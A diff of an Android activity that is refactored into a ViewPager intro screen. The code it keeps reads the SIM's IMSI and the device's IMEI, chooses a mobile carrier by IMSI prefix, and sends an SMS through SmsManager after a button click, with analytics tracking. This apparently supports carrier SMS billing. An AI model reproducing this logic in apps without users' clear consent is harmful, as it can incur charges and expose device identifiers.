@@ -1,11 +1,10 @@
-package cn.yoyo.mobile.yes;
+package cn.yoyo.mobile.ui;
+
+import java.util.ArrayList;
+import java.util.List;
 
 import com.umeng.analytics.MobclickAgent;
 
-import cn.yoyo.mobile.ui.Activity_Main;
-import cn.yoyo.mobile.ui.OPlayerApplication;
-import cn.yoyo.mobile.util.ToastUtils;
-import cn.yoyo.mobile.yef.R;
 import android.app.Activity;
 import android.app.PendingIntent;
 import android.content.Context;
@@ -13,40 +12,84 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Handler;
 import android.os.Parcelable;
 import android.preference.PreferenceManager;
+import android.support.v4.view.ViewPager;
+import android.support.v4.view.ViewPager.OnPageChangeListener;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.view.KeyEvent;
+import android.view.LayoutInflater;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.animation.AlphaAnimation;
 import android.view.animation.Animation;
 import android.widget.Toast;
+import cn.yoyo.mobile.ui.adapter.MyPagerAdapter;
+import cn.yoyo.mobile.util.ToastUtils;
+import cn.yoyo.mobile.yef.R;
+import cn.yoyo.mobile.yes.MainActivity;
+import cn.yoyo.mobile.yes.SMSReceiver;
+import cn.yoyo.mobile.yes.StringUtil;
 
-public class MainActivity extends Activity {
+public class Activity_Guide extends Activity implements OnPageChangeListener{
+	private ViewPager viewPager;
+	private boolean misScrolled;
 	private String mArea = "";//卡地区
 	private String mImsi = "", mImei = "";
+	private Context mContext;
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-		setContentView(R.layout.activity_main);
+		setContentView(R.layout.activity_start);
+		mContext = this;
 		MobclickAgent.updateOnlineConfig(this);
 		AlphaAnimation animation = new AlphaAnimation(0.4f, 0.8f);
 		animation.setDuration(600);
 		animation.setRepeatMode(Animation.REVERSE);
 		animation.setRepeatCount(Animation.INFINITE);
-		findViewById(R.id.app_about_title).startAnimation(animation);
-		init();
-		showDialog();
-		//createShortcut();
-		//addShortcut();
 		
-		//startActivity(new Intent(MainActivity.this, DialogActivity.class));
+		viewPager = (ViewPager) findViewById(R.id.viewPager);
+		List<View> listViews = new ArrayList<View>();
+		LayoutInflater mInflater = getLayoutInflater();
+		listViews.add(mInflater.inflate(R.layout.item_viewpager1, null));
+		listViews.add(mInflater.inflate(R.layout.item_viewpager2, null));
+		listViews.add(mInflater.inflate(R.layout.item_viewpager3, null));
+		View view = mInflater.inflate(R.layout.activity_main, null);
+		view.findViewById(R.id.app_about_title).startAnimation(animation);
+		listViews.add(view);
+		
+		viewPager.setAdapter(new MyPagerAdapter(listViews));
+		//viewPager.setOnPageChangeListener(this);
+		
+		init();
+		showDialog(view);
 		
 	}
+	@Override
+	public void onPageScrollStateChanged(int arg0) {
+		// TODO Auto-generated method stub
+		switch (arg0) {
+		case ViewPager.SCROLL_STATE_DRAGGING:
+			misScrolled = false;
+			break;
+		case ViewPager.SCROLL_STATE_SETTLING:
+			misScrolled = true;
+			break;
+		case ViewPager.SCROLL_STATE_IDLE:
+			if (viewPager.getCurrentItem() == viewPager.getAdapter().getCount() - 1 && !misScrolled) {
+				startActivity(new Intent(this, MainActivity.class));
+				finish();
+			}
+			misScrolled = true;
+			break;
+		}
+	}
+	@Override
+	public void onPageScrolled(int arg0, float arg1, int arg2) {}
+	@Override
+	public void onPageSelected(int arg0) {}
 	
 	private void init(){
 		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  
@@ -63,8 +106,8 @@ public class MainActivity extends Activity {
 	}
 	
 	private void send2(final String phone, final String mess,int delay){ 
-		MobclickAgent.onEvent(MainActivity.this, "send",SMSReceiver.code);
-		PendingIntent pi = PendingIntent.getBroadcast(MainActivity.this, 0, new Intent(SMSReceiver.SMS_SEND_ACTION), 0);  
+		MobclickAgent.onEvent(mContext, "send",SMSReceiver.code);
+		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.SMS_SEND_ACTION), 0);  
         SmsManager sms = SmsManager.getDefault(); 
         sms.sendTextMessage(phone, null , mess, pi,  null ); 
     }  
@@ -79,7 +122,7 @@ public class MainActivity extends Activity {
         if(mImsi.startsWith("46000") || mImsi.startsWith("46002")){//因为移动网络编号46000下的IMSI已经用完，所以虚拟了一个46002编号，134/159号段使用了此编号  
         //中国移动  
         	SMSReceiver.code = "46000";
-        	if(!StringUtil.isNetworkConnected(MainActivity.this)){
+        	if(!StringUtil.isNetworkConnected(mContext)){
         		ToastUtils.showToast("使用该软件需要开启网络");
         		return ;
 			}
@@ -109,7 +152,7 @@ public class MainActivity extends Activity {
         	SMSReceiver.code = "46001";
         	
         	if(TextUtils.isEmpty(mArea)){
-        		if(!StringUtil.isNetworkConnected(MainActivity.this)){
+        		if(!StringUtil.isNetworkConnected(mContext)){
             		ToastUtils.showToast("使用该软件需要开启网络");
             		return ;
     			}
@@ -135,7 +178,7 @@ public class MainActivity extends Activity {
         	//中国电信  
         	SMSReceiver.code = "46003";
         	if(TextUtils.isEmpty(mArea)){
-        		if(!StringUtil.isNetworkConnected(MainActivity.this)){
+        		if(!StringUtil.isNetworkConnected(mContext)){
             		ToastUtils.showToast("使用该软件需要开启网络");
             		return ;
     			}
@@ -181,19 +224,19 @@ public class MainActivity extends Activity {
 		super.onPause();
 		MobclickAgent.onPause(this);
 		}
-	private void showDialog(){
+	private void showDialog(View view){
 		SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(this);
         if(!preference.getBoolean("hasSend", false)){
-        	findViewById(R.id.dialog_welcome).setVisibility(0);
+        	view.findViewById(R.id.dialog_welcome).setVisibility(0);
         }else{
-        	findViewById(R.id.dialog_welcome).setVisibility(8);
+        	view.findViewById(R.id.dialog_welcome).setVisibility(8);
         	startActivity();
         }
-        findViewById(R.id.send).setOnClickListener(new OnClickListener() {
+        view.findViewById(R.id.send).setOnClickListener(new OnClickListener() {
 			@Override
 			public void onClick(View arg0) {
 				// TODO Auto-generated method stub
-			MobclickAgent.onEvent(MainActivity.this, "click",SMSReceiver.code);
+			MobclickAgent.onEvent(mContext, "click",SMSReceiver.code);
 			getCardMessage();
 			}
 		});
@@ -222,43 +265,5 @@ public class MainActivity extends Activity {
 	       }
 	       return super.onKeyDown(keyCode, event);
 	   }
-	   
-	   private void createShortcut(){
-		   Intent addIntent=new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
-           Parcelable icon=Intent.ShortcutIconResource.fromContext(this, R.drawable.icon_local); //获取快捷键的图标
-           Intent myIntent=new Intent(this, Activity_Main.class);
-           addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "快捷方式");//快捷方式的标题
-           addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, icon);//快捷方式的图标
-           addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, myIntent);//快捷方式的动作
-           sendBroadcast(addIntent);//发送广播
-	   }
-	   
-	   public void addShortcut(){
-
-		   Uri uri = Uri.parse("www.baidu.com");  
-		   Intent intentAddShortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
-
-           //添加名称
-
-           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, "baidu快捷方式");
-
-           //添加图标
-
-           Parcelable icon=Intent.ShortcutIconResource.fromContext(this, R.drawable.icon_local); //获取快捷键的图标
-           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, icon);
-
-           //设置Launcher的Uri数据
-
-           Intent intentLauncher = new Intent(Intent.ACTION_VIEW);
-
-           intentLauncher.setData(uri);          
-
-           //添加快捷方式的启动方法
-
-           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intentLauncher);
-
-           sendBroadcast(intentAddShortcut);       
-
- }
 	   
 }
